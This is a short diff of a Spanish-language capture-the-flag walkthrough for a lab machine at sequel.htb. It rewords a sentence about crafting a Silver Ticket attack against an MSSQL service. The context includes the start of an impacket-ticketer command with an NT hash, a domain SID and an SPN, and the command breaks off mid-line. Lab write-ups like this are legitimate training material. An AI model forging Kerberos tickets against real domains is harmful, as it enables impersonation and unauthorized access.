@@ -230,7 +230,8 @@ Get-LocalUser -Name $env:USERNAME | Select sid
 ![[Pasted image 20240329181459.png]]
 
 ### MSSQL service
-ahora vamos a craftear un  `Silver Ticket attack` El parámetro `SPN` es necesario para generar un ticket válido, pero podemos colocar lo que queramos ya que, para empezar, no está configurado.
+ahora vamos a craftear un  `Silver Ticket attack` El parámetro `SPN` es necesario para generar un ticket válido, pero podemos colocar lo que queramos ya que, no está configurado.
+
 ```python
 impacket-ticketer -nthash 1443EC19DA4DAC4FFC953BCA1B57B4CF -domain-sid S-1-5-21-
 4078382237-1492182817-2568127209 -domain sequel.htb -dc-ip dc.sequel.htb -spn
